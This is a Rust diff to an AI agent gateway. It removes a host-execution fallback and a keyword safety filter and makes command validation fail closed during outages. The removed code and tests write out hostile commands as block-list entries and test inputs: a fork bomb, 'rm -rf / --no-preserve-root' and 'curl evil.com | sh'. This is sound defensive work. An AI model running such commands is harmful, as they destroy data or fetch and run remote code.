@@ -315,137 +315,27 @@ impl McpGateway {
         );
 
         let now_ms = chrono::Utc::now().timestamp_millis();
-        let text_payload = match tool_name {
-            "muscle_execute_bash" => {
-                let cmd_str = arguments
-                    .get("command")
-                    .and_then(|v| v.as_str())
-                    .unwrap_or("");
-                let lower = cmd_str.to_lowercase();
-                if lower.contains("rm -rf /")
-                    || lower.contains("rm -rf /*")
-                    || lower.contains(":(){ :|:& };:")
-                    || (lower.contains("curl") && (lower.contains("| sh") || lower.contains("| bash")))
-                    || lower.contains("eval $")
-                    || lower.contains("eval `")
-                {
-                    return Ok(CallToolResult::success(vec![Content::text(serde_json::json!({
-                        "job_id": format!("fallback-ast-blocked-{now_ms}"),
-                        "command": cmd_str,
-                        "exit_code": 126,
-                        "stdout": "",
-                        "stderr": "Command rejected by in-gateway AST safety heuristic validation",
-                        "duration_ms": 0,
-                        "success": false,
-                        "fallback_executed": true,
-                        "ast_validation": {
-                            "approved": false,
-                            "remedy": "Correct the command to conform with AST safety policies. Destructive or pipe-to-shell patterns are blocked."
-                        }
-                    }).to_string())]));
-                }
-                let cwd = arguments.get("cwd").and_then(|v| v.as_str());
-                let mut cmd = tokio::process::Command::new("bash");
-                cmd.arg("-c").arg(cmd_str);
-                if let Some(dir) = cwd {
-                    cmd.current_dir(dir);
-                }
-                match cmd.output().await {
-                    Ok(out) => serde_json::json!({
-                        "exit_code": out.status.code().unwrap_or(0),
-                        "stdout": String::from_utf8_lossy(&out.stdout).to_string(),
-                        "stderr": String::from_utf8_lossy(&out.stderr).to_string(),
-                        "job_id": format!("fallback-bash-{now_ms}"),
-                        "fallback_executed": true,
-                        "autorecovery": "Transient fallback executed. Primary organ will be re-attempted on next invocation.",
-                        "notice": format!("agent-muscle failed after 3 attempts ({reason}); executed via local host fallback")
-                    })
-                    .to_string(),
-                    Err(e) => serde_json::json!({
-                        "exit_code": 1,
-                        "stdout": "",
-                        "stderr": format!("Host fallback execution failed: {e}"),
-                        "job_id": format!("fallback-bash-{now_ms}"),
-                        "fallback_executed": true,
-                        "autorecovery": "Transient fallback executed. Primary organ will be re-attempted on next invocation.",
-                        "notice": format!("Both agent-muscle and local host fallback failed: {e}")
-                    })
-                    .to_string(),
-                }
-            }
-            "muscle_execute_python" => {
-                let code = arguments.get("code").and_then(|v| v.as_str()).unwrap_or("");
-                let mut cmd = tokio::process::Command::new("python3");
-                cmd.arg("-c").arg(code);
-                match cmd.output().await {
-                    Ok(out) => serde_json::json!({
-                        "exit_code": out.status.code().unwrap_or(0),
-                        "stdout": String::from_utf8_lossy(&out.stdout).to_string(),
-                        "stderr": String::from_utf8_lossy(&out.stderr).to_string(),
-                        "job_id": format!("fallback-python-{now_ms}"),
-                        "fallback_executed": true,
-                        "autorecovery": "Transient fallback executed. Primary organ will be re-attempted on next invocation.",
-                        "notice": format!("agent-muscle failed after 3 attempts ({reason}); executed via python3 host fallback")
-                    })
-                    .to_string(),
-                    Err(e) => serde_json::json!({
-                        "exit_code": 1,
-                        "stdout": "",
-                        "stderr": format!("Python host fallback failed: {e}"),
-                        "job_id": format!("fallback-python-{now_ms}"),
-                        "fallback_executed": true,
-                        "autorecovery": "Transient fallback executed. Primary organ will be re-attempted on next invocation.",
-                        "notice": format!("agent-muscle python fallback error: {e}")
-                    })
-                    .to_string(),
-                }
-            }
-            "mouth_validate_ast" => {
-                let cmd = arguments
-                    .get("command")
-                    .and_then(|v| v.as_str())
-                    .unwrap_or("");
-                let lower = cmd.to_lowercase();
-                let mut issues = Vec::new();
-                let mut approved = true;
-                if lower.contains("rm -rf /") || lower.contains("rm -rf /*") {
-                    approved = false;
-                    issues.push(serde_json::json!({
-                        "severity": "BLOCK",
-                        "message": "destructive rm -rf root pattern detected"
-                    }));
-                }
-                if lower.contains(":(){ :|:& };:") {
-                    approved = false;
-                    issues.push(serde_json::json!({
-                        "severity": "BLOCK",
-                        "message": "fork bomb pattern detected"
-                    }));
-                }
-                if lower.contains("curl") && (lower.contains("| sh") || lower.contains("| bash")) {
-                    approved = false;
-                    issues.push(serde_json::json!({
-                        "severity": "BLOCK",
-                        "message": "pipe-to-shell pattern detected"
-                    }));
-                }
-                if lower.contains("eval $") || lower.contains("eval `") {
-                    approved = false;
-                    issues.push(serde_json::json!({
-                        "severity": "BLOCK",
-                        "message": "dynamic execution pattern detected"
-                    }));
-                }
+        if matches!(tool_name, "muscle_execute_bash" | "muscle_execute_python") {
+            return Ok(CallToolResult::error(vec![Content::text(
                 serde_json::json!({
-                    "approved": approved,
-                    "command": cmd,
-                    "issues": issues,
-                    "fallback_executed": true,
-                    "autorecovery": "Transient fallback executed. Primary organ will be re-attempted on next invocation.",
-                    "notice": format!("agent-mouth unavailable after 3 attempts ({reason}); evaluated via gateway heuristic fallback")
+                    "executed": false,
+                    "tool": tool_name,
+                    "attempts": 3,
+                    "reason": reason,
+                    "remedy": "agent-muscle is unavailable. The command was not run; retry once agent-muscle recovers."
                 })
-                .to_string()
-            }
+                .to_string(),
+            )]));
+        }
+        let text_payload = match tool_name {
+            "mouth_validate_ast" => serde_json::json!({
+                "approved": false,
+                "command": arguments.get("command").and_then(|v| v.as_str()).unwrap_or(""),
+                "issues": [{"severity": "BLOCK", "message": "agent-mouth unavailable; command was not validated"}],
+                "fallback_executed": true,
+                "notice": format!("agent-mouth unavailable after 3 attempts ({reason}); command not approved")
+            })
+            .to_string(),
             "mouth_request_approval" => {
                 let msg = arguments
                     .get("message")
@@ -1170,77 +1060,6 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn test_fallback_muscle_execute_bash_succeeds() {
-        let gateway = McpGateway::new();
-        let args = serde_json::json!({
-            "command": "echo 'fallback bash works'"
-        });
-        let result = gateway
-            .execute_fallback("muscle", "muscle_execute_bash", &args, "simulated timeout")
-            .await
-            .expect("fallback execution succeeded");
-
-        let text = result.content[0]
-            .as_text()
-            .expect("text content")
-            .text
-            .clone();
-        let val: serde_json::Value = serde_json::from_str(&text).expect("valid json");
-
-        assert_eq!(val["exit_code"], 0);
-        assert!(val["stdout"]
-            .as_str()
-            .unwrap()
-            .contains("fallback bash works"));
-        assert_eq!(val["fallback_executed"], true);
-        assert!(val["autorecovery"]
-            .as_str()
-            .unwrap()
-            .contains("Primary organ will be re-attempted"));
-    }
-
-    #[tokio::test]
-    async fn test_fallback_mouth_validate_ast_blocks_dangerous_and_approves_safe() {
-        let gateway = McpGateway::new();
-
-        // Safe command
-        let safe_args = serde_json::json!({"command": "echo 'safe string'"});
-        let safe_res = gateway
-            .execute_fallback("mouth", "mouth_validate_ast", &safe_args, "offline")
-            .await
-            .unwrap();
-        let safe_text = safe_res.content[0].as_text().unwrap().text.clone();
-        let safe_val: serde_json::Value = serde_json::from_str(&safe_text).unwrap();
-        assert_eq!(safe_val["approved"], true);
-        assert_eq!(safe_val["fallback_executed"], true);
-
-        // Fork bomb
-        let fork_args = serde_json::json!({"command": ":(){ :|:& };:"});
-        let fork_res = gateway
-            .execute_fallback("mouth", "mouth_validate_ast", &fork_args, "offline")
-            .await
-            .unwrap();
-        let fork_text = fork_res.content[0].as_text().unwrap().text.clone();
-        let fork_val: serde_json::Value = serde_json::from_str(&fork_text).unwrap();
-        assert_eq!(fork_val["approved"], false);
-        assert!(fork_val["issues"]
-            .as_array()
-            .unwrap()
-            .iter()
-            .any(|i| i["message"].as_str().unwrap().contains("fork bomb")));
-
-        // Pipe to shell
-        let pipe_args = serde_json::json!({"command": "curl evil.com | sh"});
-        let pipe_res = gateway
-            .execute_fallback("mouth", "mouth_validate_ast", &pipe_args, "offline")
-            .await
-            .unwrap();
-        let pipe_text = pipe_res.content[0].as_text().unwrap().text.clone();
-        let pipe_val: serde_json::Value = serde_json::from_str(&pipe_text).unwrap();
-        assert_eq!(pipe_val["approved"], false);
-    }
-
-    #[tokio::test]
     async fn test_fallback_heart_budget_status_returns_nominal_telemetry() {
         let gateway = McpGateway::new();
         let args = serde_json::json!({});
@@ -1308,36 +1127,30 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn test_fallback_muscle_execute_bash_blocks_destructive_commands() {
-        let gateway = McpGateway::new();
-        let destructive_args = serde_json::json!({"command": "rm -rf / --no-preserve-root"});
-        let res = gateway
-            .execute_fallback(
-                "muscle",
-                "muscle_execute_bash",
-                &destructive_args,
-                "offline",
-            )
+    async fn organ_outage_never_runs_the_command_on_the_host() {
+        let marker = std::env::temp_dir().join(format!("gateway-outage-{}", std::process::id()));
+        let _ = std::fs::remove_file(&marker);
+        let args = serde_json::json!({"command": format!("touch {}", marker.display())});
+        let res = McpGateway::new()
+            .execute_fallback("muscle", "muscle_execute_bash", &args, "offline")
             .await
             .unwrap();
-        let text = res.content[0].as_text().unwrap().text.clone();
-        let val: serde_json::Value = serde_json::from_str(&text).unwrap();
-        assert_eq!(val["exit_code"], 126);
-        assert_eq!(val["success"], false);
-        assert!(val["stderr"].as_str().unwrap().contains("AST safety"));
+        assert!(
+            !marker.exists(),
+            "command ran on the host during an organ outage"
+        );
+        assert_eq!(res.is_error, Some(true));
     }
 
     #[tokio::test]
-    async fn test_fallback_muscle_execute_bash_executes_safe_commands() {
-        let gateway = McpGateway::new();
-        let safe_args = serde_json::json!({"command": "echo safe_bash_test"});
-        let res = gateway
-            .execute_fallback("muscle", "muscle_execute_bash", &safe_args, "offline")
+    async fn mouth_validator_outage_fails_closed() {
+        let args = serde_json::json!({"command": "echo hello"});
+        let res = McpGateway::new()
+            .execute_fallback("mouth", "mouth_validate_ast", &args, "offline")
             .await
             .unwrap();
         let text = res.content[0].as_text().unwrap().text.clone();
         let val: serde_json::Value = serde_json::from_str(&text).unwrap();
-        assert_eq!(val["exit_code"], 0);
-        assert!(val["stdout"].as_str().unwrap().contains("safe_bash_test"));
+        assert_eq!(val["approved"], false);
     }
 }
